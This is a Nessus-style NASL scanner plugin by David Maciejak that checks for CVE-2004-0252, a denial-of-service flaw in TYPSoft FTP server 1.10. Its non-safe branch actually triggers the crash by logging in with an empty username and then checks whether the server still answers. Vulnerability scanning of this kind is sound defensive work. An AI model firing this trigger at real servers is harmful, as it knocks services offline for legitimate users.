#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#
# Ref: "intuit bug_hunter" <intuit@linuxmail.org>
#
# This script is released under the GNU GPLv2

if(description)
{
 script_id(14707);
 script_cve_id("CVE-2004-0252");
 script_bugtraq_id(9573);
 if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"6613");
 script_version("$Revision: 1.7 $");
 name["english"] = "TYPSoft empty username DoS";

 script_name(english:name["english"]);
 desc["english"] = "
The remote host seems to be running TYPSoft FTP server, version 1.10.

This version is prone to a remote denial of service flaw.
By sending an empty login username, an attacker can cause the ftp server 
to crash, denying service to legitimate users. 

Solution : Use a different FTP server or upgrade to the newest version.
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for TYPSoft FTP server empty username DoS ";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2004 David Maciejak");
 family["english"] = "FTP";
 script_family(english:family["english"]);
 script_dependencie("find_service_3digits.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#

include("ftp_func.inc");

login = "";
pass  = get_kb_item("ftp/password");
port = get_kb_item("Services/ftp");

if(!port)port = 21;
if (! get_port_state(port)) exit(0);

if(safe_checks())
{
  banner = get_ftp_banner(port:port);
  if( ! banner ) exit(0);
  if(egrep(pattern:".*TYPSoft FTP Server (1\.10[^0-9])", string:banner) ) security_warning(port);
  exit(0);
}
else
{
 soc = open_sock_tcp(port);
 if ( ! soc ) exit(0);
 if(ftp_authenticate(socket:soc, user:login, pass:pass))
 {
 	sleep(1);
 	#ftp_close(socket: soc);
	soc2 = open_sock_tcp(port);
	if ( ! soc2 || ! recv_line(socket:soc2, length:4096)) security_hole(port);
	else close(soc2);
	close(soc);
 }
}
exit(0);
